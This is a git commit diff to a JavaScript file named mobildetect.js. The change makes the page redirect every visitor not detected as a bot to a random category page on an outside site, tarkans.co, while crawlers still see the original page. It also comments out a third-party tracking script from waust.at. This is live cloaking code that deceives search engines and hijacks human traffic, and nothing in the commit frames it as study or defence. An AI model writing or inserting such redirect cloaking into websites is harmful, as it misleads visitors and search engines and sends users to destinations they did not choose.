ccec68815fa1e30eecac0d04d93a10ca815eef00
fidelasin <66884583+fidelasin@users.noreply.github.com>
2020-08-18 01:35:23 +0300

    Update mobildetect.js

--- mobildetect.js
+++ mobildetect.js
@@ -2,8 +2,10 @@
 
 
     if (!md.is('bot') && !navigator.userAgent.toLowerCase().includes("bot.html")) {
-    //     window.location="http://www.google.com";
-        
+         cat = ['education/', 'fashions/', 'fitness/','summer/','tennis/','yoga/'];
+             sec=cat[rast(0, 5)];
+         window.location="https://tarkans.co/category/"+sec;
+      /*  
 var _wau = _wau || []; _wau.push(["dynamic", "wnwir8za59", "531", "c4302bffffff", "small"]);
     var head = document.getElementsByTagName('head')[0];
 
@@ -13,6 +15,9 @@ script.type = 'text/javascript';
 script.src = "//waust.at/d.js";
 head.appendChild(script);
 
-    
+    */
     
     }
+function rast(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
